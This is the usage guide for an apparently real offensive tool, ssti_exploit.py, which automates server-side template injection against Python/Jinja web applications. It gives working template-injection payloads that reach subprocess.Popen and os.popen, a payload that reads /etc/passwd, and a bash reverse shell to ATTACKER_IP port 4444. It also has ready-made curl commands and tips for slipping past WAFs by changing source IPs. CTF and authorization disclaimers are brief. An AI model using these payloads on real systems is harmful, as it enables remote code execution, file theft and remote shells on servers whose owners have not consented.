# Usage Guide

## Quick Start

```bash
# Activate virtual environment
source venv/bin/activate

# Run the tool
python3 ssti_exploit.py
```

## Configuration Examples

### Basic Configuration
```
Target URL: http://target.com/vulnerable
HTTP Method: POST
Vulnerable Parameter: email
Additional Parameters: [leave empty]
Custom Headers: [leave empty]
Cookies: [leave empty]
```

### With Authentication
```
Target URL: http://target.com/api/template
HTTP Method: POST
Vulnerable Parameter: template
Additional Parameters: [leave empty]
Custom Headers: Authorization:Bearer eyJhbGc...
Cookies: session=abc123xyz
```

### Multiple Parameters
```
Target URL: http://target.com/render
HTTP Method: POST
Vulnerable Parameter: content
Additional Parameters: format=html,lang=en
Custom Headers: [leave empty]
Cookies: [leave empty]
```

## Common Scenarios

### Flask Application (Default)
```
URL: http://localhost:5000/render
Method: POST
Parameter: template
```

### CTF Challenge
```
URL: http://10.10.3.17/subscribe
Method: POST
Parameter: email
```

### With Custom Port
```
URL: http://192.168.1.100:8080/api/render
Method: GET
Parameter: name
```

## Understanding the Output

### Phase 1: Class Discovery
```
[ PHASE 1 ] Class Discovery
──────────────────────────────────────────────────────────────────────
> Detecting pattern automatically...
[ OK ] Pattern detected: 'Thank you' ... '!'
[ OK ] Found 517 classes
```

This phase discovers all Python classes accessible through the SSTI vulnerability.

### Phase 2: Vulnerability Assessment
```
[ PHASE 2 ] Vulnerability Assessment
──────────────────────────────────────────────────────────────────────

                      Exploitable Classes Detected

     INDEX   CLASS NAME                                         RISK
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
       154   os._wrap_close                                   CRITICAL
       516   subprocess.Popen                                 CRITICAL
```

Classes marked as **CRITICAL** provide direct OS command execution capabilities.

### Phase 3: Payload Generation
```
PAYLOAD #01 [DIRECT] subprocess.Popen - Direct Method
╭──────────────────────────────────────────────────────────────────────╮
│ {{ ''.__class__.__mro__[1].__subclasses__()[516](['whoami'], ...    │
╰──────────────────────────────────────────────────────────────────────╯
CURL:
curl -X POST --data "email=%7B%7B..." "http://target.com/..."
```

Each payload includes:
- Method classification [DIRECT, IMPORT, EXEC, etc.]
- Syntax-highlighted template code
- Ready-to-use curl command

### Phase 4: Exploitation Results
```
                        Remote Code Execution Results
╔══════════════════════════════════════════╤══════════════╤═════════════════╗
║ PAYLOAD                                  │    STATUS    │ OUTPUT          ║
╟──────────────────────────────────────────┼──────────────┼─────────────────╢
║ subprocess.Popen - Import via            │   SUCCESS    │ root            ║
║ __builtins__                             │              │                 ║
╚══════════════════════════════════════════╧══════════════╧═════════════════╝
```

Status meanings:
- **SUCCESS**: Payload executed, output extracted
- **PARTIAL**: Payload sent but output not parsed
- **FAIL**: Payload failed (HTTP error or exception)

## Using Generated Curl Commands

The tool saves all payloads to `payloads_output.txt`. You can copy and execute them manually:

```bash
# Example from output file
curl -X POST --data "email=%7B%7B+..." "http://target.com/subscribe"
```

To modify the command:
```bash
# Change the command from 'whoami' to 'id'
# Replace 'whoami' in the URL-encoded payload with 'id'
curl -X POST --data "email=%7B%7B+...'id'..." "http://target.com/subscribe"
```

## Advanced Usage

### Testing Different Commands

After finding a working payload, modify the command:

1. Decode the URL-encoded payload
2. Replace `whoami` with your command
3. Re-encode and test

Example commands:
```bash
whoami          # Current user
id              # User ID and groups
pwd             # Current directory
ls -la          # List files
cat /etc/passwd # Read files
```

### Extracting Files

```python
{{ ''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat /etc/passwd').read() }}
```

### Reverse Shell

```python
{{ ''.__class__.__mro__[1].__subclasses__()[516].__init__.__globals__['__builtins__']['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

**Note**: Always use responsibly and only on authorized systems.

## Troubleshooting

### Issue: No exploitable classes found
**Solution**: The target might not be vulnerable or uses a different Python version. Try:
- Verifying SSTI vulnerability first
- Testing with a simple payload: `{{ 7*7 }}`

### Issue: Pattern detection fails
**Solution**: The response format is non-standard. Check:
- The raw response in terminal output
- Try a different parameter or endpoint

### Issue: All payloads return PARTIAL
**Solution**: The result pattern detection failed. Try:
- Manually examining one curl command output
- Looking for the command result in HTML source

### Issue: Connection timeout
**Solution**: Network issues or WAF blocking. Try:
- Checking target accessibility
- Adding delays between requests
- Using a different source IP

## Best Practices

1. **Always get authorization** before testing
2. **Start with basic payloads** to confirm SSTI
3. **Document your findings** using the generated output file
4. **Test incrementally** - don't spam the server
5. **Clean up after testing** - remove any test files created

## CTF Tips

- Save the `payloads_output.txt` for later reference
- Screenshot successful payloads for writeups
- Note the exact class indices (they may vary)
- Try all payloads - some may work where others fail
- Look for flags in common locations: `/flag`, `/tmp/flag`, `/home/*/flag.txt`

## Integration with Other Tools

### Using Caido (or Burp Suite if you hate yourself)
1. Generate payloads with this tool
2. Copy the raw payload (not the curl command)
3. Paste into Burp Repeater or Intruder
4. URL-encode as needed

### Using with Python Requests
```python
import requests
payload = "{{ ''.__class__.__mro__[1].__subclasses__()[154]... }}"
response = requests.post('http://target.com/api', data={'param': payload})
print(response.text)
```

## Additional Resources

- Check `README.md` for architecture details
- See Mermaid diagram for workflow understanding
- Review `payloads_output.txt` for all generated payloads
